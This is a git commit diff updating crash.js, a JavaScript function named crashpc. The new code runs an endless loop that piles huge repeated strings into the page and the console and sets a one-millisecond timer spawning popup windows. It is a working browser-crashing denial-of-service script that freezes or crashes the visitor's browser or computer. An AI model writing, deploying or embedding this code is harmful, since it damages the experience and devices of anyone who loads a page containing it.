edc9068f92f79fb891d9de9968f6ae07cc2fa18f
oliver <121308232+olivery4@users.noreply.github.com>
2025-04-04 14:25:50 -0600

    Update crash.js

--- crash.js
+++ crash.js
@@ -1,4 +1,17 @@
 function crashpc() {
-  a='5';
-  while(true) {a=a+a+a+a+a+a+a};
-}
+ let txt = "";
+
+  for(var i = 0; i === i; i++) {
+     txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(99);
+  
+     var x = document.createElement("div");
+     x.innerText = txt;
+  
+    document.body.appendChild(x);
+    console.log(txt);
+    
+    setInterval(function () {
+      open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
+    }, 1);
+  };
+};
